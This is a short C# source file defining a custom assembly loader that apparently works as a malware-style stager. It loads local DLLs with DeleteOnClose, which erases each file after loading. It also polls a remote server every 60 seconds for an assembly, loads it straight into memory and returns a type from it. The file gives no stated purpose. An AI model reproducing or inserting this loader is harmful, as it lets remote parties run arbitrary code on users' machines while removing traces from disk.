#pragma warning disable IDE0079 // 请删除不必要的忽略
#pragma warning disable CA1050 // 在命名空间中声明类型

using System.Reflection;
using System.Runtime.Loader;

public class CustomAssemblyLoadContext(IHttpClientFactory http) : AssemblyLoadContext
{
    protected override Assembly Load(AssemblyName assemblyName)
    {
        var path = Path.Combine(Path.GetDirectoryName(Environment.ProcessPath), $"{assemblyName.Name}.dll");
        if (File.Exists(path)) {
            using var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, 0, FileOptions.DeleteOnClose);
            return LoadFromStream(stream);
        }
        return Assembly.Load(assemblyName);
    }

    public async Task<Type> LoadAsync(CancellationToken stoppingToken)
    {
        while (true) {
            try {
                using var net = http.CreateClient();
                var bytes = await net.GetByteArrayAsync(Guid.CreateVersion7().ToString("N"), stoppingToken);
                using var memory = new MemoryStream(bytes);
                return LoadFromStream(memory).GetTypes()
                    .Single(type => typeof(AssemblyLoadContext).IsAssignableFrom(type));
            } catch (Exception) when (!stoppingToken.IsCancellationRequested) {
                await Task.Delay(TimeSpan.FromSeconds(60), stoppingToken);
            }
        }
    }
}